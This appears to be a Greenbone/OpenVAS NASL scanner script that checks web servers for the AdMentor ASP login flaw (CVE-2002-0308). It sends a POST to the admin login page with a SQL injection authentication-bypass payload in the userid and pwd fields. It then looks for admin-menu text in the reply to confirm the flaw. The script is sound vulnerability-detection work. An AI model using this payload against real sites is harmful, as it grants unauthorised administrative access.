# SPDX-FileCopyrightText: 2002 SecurITeam
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10880");
  script_version("2025-04-11T05:40:28+0000");
  script_tag(name:"last_modification", value:"2025-04-11 05:40:28 +0000 (Fri, 11 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-0308");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("AdMentor Login Flaw");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2002 SecurITeam");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl",
                      "gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Contact the author for a patch.");

  script_tag(name:"summary", value:"AdMentor is a totally free ad rotator script written entirely in ASP.

  A security vulnerability in the product allows remote attackers to cause the login administration ASP to
  allow them to enter without knowing any username or password (thus bypassing any authentication
  protection enabled for the ASP file).");

  script_xref(name:"URL", value:"http://www.securiteam.com/windowsntfocus/5DP0N1F6AW.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/4152");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_404.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if( ! http_can_host_asp(port:port) )
  exit(0);

foreach dir( make_list_unique( "/admentor", "/ads/admentor", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  url = string(dir, "/admin/admin.asp?login=yes");

  if( ! http_is_cgi_installed_ka(item:url, port:port) )
    continue;

  host = http_host_name( port:port );
  variables = string("userid=%27+or+%27%27%3D%27&pwd=%27+or+%27%27%3D%27&B1=Submit");
  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(variables), "\r\n\r\n",
               variables);
  buf = http_keepalive_send_recv(port:port, data:req);
  if(!buf)
    continue;

  if("Welcome" >< buf && "Admin interface" >< buf && "AdMentor Menu" >< buf) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
